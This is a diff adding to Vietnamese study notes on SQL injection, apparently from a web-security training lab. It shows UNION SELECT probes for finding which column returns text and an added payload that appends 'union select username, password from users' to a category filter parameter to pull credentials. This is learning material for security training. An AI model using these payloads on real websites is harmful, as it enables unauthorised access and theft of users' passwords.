@@ -56,3 +56,10 @@ cột chứa kiểu dữ liệu khớp với truy vấn trước đó nên ta c�
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 nếu báo lỗi thì thử tiếp khi không lỗi nữa thì oke.
+
+sau khi thực hiện được các bước trên là biết số cột -> kiểu dữ liệu từng cột thì sau đó ta có thể truy vấn các thông tin thú vị 
+mà ta cần ví dụ:
+.../filter?category=Gifts' union select username, password from users-- -
+ở đây ta đã biết trước được là The database contains a different table called users, with columns called username and password.
+
+
